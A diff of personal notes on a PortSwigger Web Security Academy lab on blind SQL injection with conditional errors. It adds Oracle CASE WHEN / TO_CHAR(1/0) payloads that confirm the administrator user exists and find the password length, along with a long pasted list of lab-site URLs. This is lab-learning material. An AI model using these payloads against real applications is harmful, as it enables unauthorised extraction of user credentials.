@@ -24,20 +24,90 @@ Analysis:
 3) Confirm that the administrator user exists in the users table
 ' || (select '' from users where username='administrator') || ' 
 
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' -> should output error
+' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' -> should work
 
-' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' 
+3 (a)' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || ' 
+-> Internal server error 500 -> administrator user exists
 
-' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || ' 
--> Internal server error -> administrator user exists
-
-' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='fwefwoeijfewow') || ' 
+3 (b)' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='fwefwoeijfewow') || ' 
 -> 200 response -> user does not exist in database
+
+The from clause will be executed first before select, hence 3 (a) and 3 (b)
 
 4) Determine length of password
 
-' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>19) || ' 
+(a)' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>50) || '
 -> 200 response at 50 -> length of password is less than 50
--> 20 characters
+(b)' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>19) || '
+-> Internal server error 500 till 19
+(c)' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>20) || '
+-> 200 response at 20 -> length of password is 20
+
+do 4 (a) and (b), (c) in intruder to find length
+
+intruder O/p:
+http://www.w3.org/1999/xlink
+http://www.w3.org/2000/svg
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/filter?category=Accessories
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/filter?category=Corporate+gifts
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/filter?category=Food+%26+Drink
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/filter?category=Gifts
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/filter?category=Lifestyle
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/image/productcatalog/products/20.jpg
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/image/productcatalog/products/21.jpg
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/image/productcatalog/products/23.jpg
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/image/productcatalog/products/29.jpg
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/image/productcatalog/products/30.jpg
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/image/productcatalog/products/31.jpg
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/image/productcatalog/products/36.jpg
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/image/productcatalog/products/38.jpg
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/image/productcatalog/products/4.jpg
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/image/productcatalog/products/45.jpg
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/image/productcatalog/products/48.jpg
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/image/productcatalog/products/5.jpg
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/image/productcatalog/products/53.jpg
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/image/productcatalog/products/58.jpg
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/image/productcatalog/products/6.jpg
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/image/productcatalog/products/61.jpg
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/image/productcatalog/products/67.jpg
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/image/productcatalog/products/7.jpg
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/image/productcatalog/products/71.jpg
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/image/productcatalog/products/8.jpg
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/my-account
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/product?productId=1
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/product?productId=10
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/product?productId=11
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/product?productId=12
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/product?productId=13
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/product?productId=14
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/product?productId=15
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/product?productId=16
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/product?productId=17
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/product?productId=18
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/product?productId=19
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/product?productId=2
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/product?productId=20
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/product?productId=3
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/product?productId=4
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/product?productId=5
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/product?productId=6
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/product?productId=7
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/product?productId=8
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/product?productId=9
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/resources/css/labs.css
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/resources/css/labsEcommerce.css
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/resources/images/rating1.png
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/resources/images/rating2.png
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/resources/images/rating3.png
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/resources/images/rating4.png
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/resources/images/rating5.png
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/resources/images/shop.svg
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/resources/labheader/css/academyLabHeader.css
+https://0ad600c40449e4c48077efc9008f00f9.web-security-academy.net/resources/labheader/js/labHeader.js
+https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
+
 
 5) Output the administrator password
 
